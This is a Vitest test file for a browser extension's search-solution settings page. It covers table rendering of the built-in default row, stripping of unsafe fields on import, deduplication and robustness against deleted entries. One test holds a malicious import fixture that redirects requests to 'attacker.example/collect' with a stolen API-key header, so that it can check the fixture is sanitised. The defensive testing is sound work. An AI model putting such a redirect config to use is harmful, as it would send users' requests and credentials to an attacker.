/**
 * 搜索方案页：内置默认方案渲染为表格行。
 *
 * Q-3 改造：原断言读 `SetSearchSolution/Index.vue` 源码文本，检查 `<a-table>` 子块里
 * 没有 `<template #title>`、有 `:data-source="tableRows"` / `:row-selection="rowSelection"`，
 * 并在整份源码里出现 `isBuiltInDefault`。这些都是"模板里写了这些字"。
 *
 * 现在真实挂载该视图，断言**渲染结果**：
 * - 内置默认方案（「全部」）确实作为一行出现在表格 tbody 里；
 * - 它没有被塞到表格标题区（`.ant-table-title` 不存在 / 不含它）；
 * - 表格带选择列，且内置行不可被选中（原来靠 `rowSelection.disabled` 表达的行为）。
 */
import { readFileSync } from "node:fs";
import { resolve } from "node:path";

import { describe, expect, it, vi } from "vitest";

import { mountOptionsView, prepareOptionsPinia } from "../../helpers/optionsView.ts";

vi.mock("@/messages.ts", () => ({ sendMessage: vi.fn(), onMessage: vi.fn() }));

function preparePiniaWithSave() {
  const pinia = prepareOptionsPinia();
  pinia.use(({ store }) => {
    (store as any).$save = async () => {};
  });
  return pinia;
}

const DEFAULT_ROW_NAME = "全部";

describe("搜索方案默认行布局", () => {
  it("内置默认方案是表格里的一行，而不是顶到表格标题区域", async () => {
    const pinia = prepareOptionsPinia();
    const { default: SetSearchSolution } = await import("@/options/views/Settings/SetSearchSolution/Index.vue");

    const view = mountOptionsView(SetSearchSolution, { pinia, router: true });
    await view.settle(120);

    const table = view.$(".ant-table");
    expect(table, "应渲染出表格").not.toBeNull();

    const bodyText = view.$(".ant-table-tbody")?.textContent ?? "";
    expect(bodyText, "内置默认方案应作为 tbody 的一行渲染").toContain(DEFAULT_ROW_NAME);

    // 标题区（a-table 的 #title 插槽）不应存在，更不应承载内置行
    expect(view.$(".ant-table-title"), "不应把内置行放到表格标题区").toBeNull();

    // 选择列存在（行选择能力保留），且内置行是禁用态
    expect(view.$(".ant-table-selection-column"), "表格应带选择列").not.toBeNull();
    const defaultRow = view.$$(".ant-table-tbody tr").find((row) => (row.textContent ?? "").includes(DEFAULT_ROW_NAME));
    expect(defaultRow, "应能定位到内置默认方案所在行").toBeDefined();
    const checkbox = defaultRow!.querySelector<HTMLInputElement>('input[type="checkbox"]');
    expect(checkbox, "内置行应有选择框（只是禁用）").not.toBeNull();
    expect(checkbox!.disabled, "内置默认方案不可被选中（不能删除/导出它）").toBe(true);

    view.unmount();
  });
});

describe("F2-High-14：导入搜索方案时剥离可改写请求目标的 requestConfig", () => {
  async function mountIndex() {
    const pinia = preparePiniaWithSave();
    const { useMetadataStore } = await import("@/options/stores/metadata.ts");
    const { useRuntimeStore } = await import("@/options/stores/runtime.ts");
    const metadataStore = useMetadataStore(pinia);
    (metadataStore as any).$ready = true;
    const runtimeStore = useRuntimeStore(pinia);
    const snackbar = vi.spyOn(runtimeStore, "showSnakebar");

    const { default: SetSearchSolution } = await import("@/options/views/Settings/SetSearchSolution/Index.vue");
    const view = mountOptionsView(SetSearchSolution, { pinia, router: true });
    await view.settle(120);
    return { view, metadataStore, snackbar };
  }

  it("url / baseURL / headers 被剥离，只保留 params / data；并提示用户", async () => {
    const { view, metadataStore, snackbar } = await mountIndex();
    try {
      const importText = JSON.stringify([
        {
          name: "evil-solution",
          solutions: [
            {
              siteId: "mteam",
              searchEntries: {
                x: {
                  requestConfig: {
                    url: "https://attacker.example/collect",
                    baseURL: "https://attacker.example",
                    headers: { "x-api-key": "stolen" },
                    method: "post",
                    params: { q: "1" },
                    data: { d: 1 },
                  },
                },
              },
            },
          ],
        },
      ]);

      (view.app as any)._instance.setupState.handleImportFileText(importText);
      await view.settle(80);

      const stored = Object.values(metadataStore.solutions)[0] as any;
      expect(stored, "方案本身应被导入（只剥离危险字段）").toBeDefined();
      const requestConfig = stored.solutions[0].searchEntries.x.requestConfig;
      expect(requestConfig).toEqual({ params: { q: "1" }, data: { d: 1 } });

      const dumped = JSON.stringify(stored);
      expect(dumped).not.toContain("attacker.example");
      expect(dumped).not.toContain('"headers"');
      expect(dumped).not.toContain('"baseURL"');
      expect(dumped).not.toContain('"method"');

      expect(
        snackbar.mock.calls.some(([message]) => typeof message === "string" && /unsafe request config/i.test(message)),
        "必须告知用户导入文件里有被剥离的字段",
      ).toBe(true);
    } finally {
      view.unmount();
    }
  });

  it("requestConfig 不是对象时整条方案被拒绝（不写入 store）", async () => {
    const { view, metadataStore, snackbar } = await mountIndex();
    try {
      const importText = JSON.stringify([
        {
          name: "broken-solution",
          solutions: [{ siteId: "mteam", searchEntries: { x: { requestConfig: ["not-an-object"] } } }],
        },
      ]);

      (view.app as any)._instance.setupState.handleImportFileText(importText);
      await view.settle(80);

      expect(Object.keys(metadataStore.solutions)).toHaveLength(0);
      expect(
        snackbar.mock.calls.some(
          ([message]) => typeof message === "string" && /requestConfig is invalid|Skipped|已跳过/i.test(message),
        ),
      ).toBe(true);
    } finally {
      view.unmount();
    }
  });
});

describe("F2-Low-N7：站点默认条目的去重", () => {
  it("selectedCategories 为 {} 的两条默认条目被视为重复", async () => {
    const pinia = preparePiniaWithSave();
    void pinia;
    const { isDuplicateSearchSolution } = await import("@/options/views/Settings/SetSearchSolution/utils.ts");

    const existing = { id: "default", siteId: "mteam", selectedCategories: {}, searchEntries: {} } as any;
    const sameDefault = { id: "default", siteId: "mteam", selectedCategories: {}, searchEntries: {} } as any;
    const sameCategory = {
      id: "s2",
      siteId: "mteam",
      selectedCategories: { categories: ["1"] },
      searchEntries: {},
    } as any;
    const otherCategory = {
      id: "s3",
      siteId: "mteam",
      selectedCategories: { categories: ["2"] },
      searchEntries: {},
    } as any;

    expect(isDuplicateSearchSolution(existing, sameDefault), "默认条目必须判重").toBe(true);
    expect(isDuplicateSearchSolution(sameCategory, otherCategory), "不同分类不应判重").toBe(false);
    expect(isDuplicateSearchSolution(sameCategory, { ...sameCategory, id: "s4" }), "同分类应判重").toBe(true);
  });
});

describe("F2-Low-16 / Low-17：启用、设为默认与复制名的健壮性", () => {
  it("对已被删除的方案切换启用/默认不会抛错，也不会写入", async () => {
    const pinia = preparePiniaWithSave();
    const { useMetadataStore } = await import("@/options/stores/metadata.ts");
    const metadataStore = useMetadataStore(pinia);
    (metadataStore as any).$ready = true;
    metadataStore.solutions = {} as any;

    const { default: SetSearchSolution } = await import("@/options/views/Settings/SetSearchSolution/Index.vue");
    const view = mountOptionsView(SetSearchSolution, { pinia, router: true });
    await view.settle(120);

    try {
      const setupState: any = (view.app as any)._instance.setupState;
      expect(() => setupState.simplePatchSearchSolution("ghost", true)).not.toThrow();
      expect(() => setupState.setDefaultSearchSolution(true, "ghost")).not.toThrow();
      expect(metadataStore.solutions["ghost"]).toBeUndefined();
      expect(metadataStore.defaultSolutionId).toBe("default");
    } finally {
      view.unmount();
    }
  });

  it("复制方案的默认名与导出文件名不再硬编码英文 / 带 FIXME", () => {
    const source = readFileSync(
      resolve(import.meta.dirname, "../../../src/entries/options/views/Settings/SetSearchSolution/Index.vue"),
      "utf8",
    );
    // 只拦「用字面量拼出来的默认名」，注释里说明历史问题不算
    expect(source, "复制名应走 i18n 而不是字面量 'Copy of'").not.toMatch(/`Copy of \$\{/);
    expect(source).not.toMatch(/FIXME filename/);
    // 启用 / 默认都走带存在性守卫与去抖的 simplePatch
    expect(source).toMatch(/simplePatch\("solutions", solutionId, "enabled"/);
    expect(source).toMatch(/simplePatch\("solutions", solutionKey, "isDefault"/);
  });
});
